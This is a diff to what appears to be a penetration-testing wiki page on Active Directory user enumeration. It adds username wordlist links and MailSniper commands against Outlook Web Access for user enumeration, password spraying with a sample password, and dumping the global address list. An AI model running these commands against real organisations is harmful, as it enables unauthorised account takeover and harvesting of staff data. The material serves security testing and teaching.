@@ -91,6 +91,28 @@ msf> use auxiliary/gather/kerberos_enumusers
 crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
 ```
 
+{% hint style="warning" %}
+You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names).
+
+However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) **** to generate potential valid usernames.
+{% endhint %}
+
+#### **OWA (Outlook Web Access) Server**
+
+If you found one of these servers in the network you can also perform **user enumeration against it**. For example, you could use the tool [**MailSniper**](https://github.com/dafthack/MailSniper):
+
+```bash
+ipmo C:\Tools\MailSniper\MailSniper.ps1
+# Get info about the domain
+Invoke-DomainHarvestOWA -ExchHostname [ip]
+# Enumerate valid users from a list of potential usernames
+Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
+# Password spraying
+Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
+# Get addresses list from the compromised mail
+Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
+```
+
 ### Knowing one or several usernames
 
 Ok, so you know you have already a valid username but no passwords... Then try:
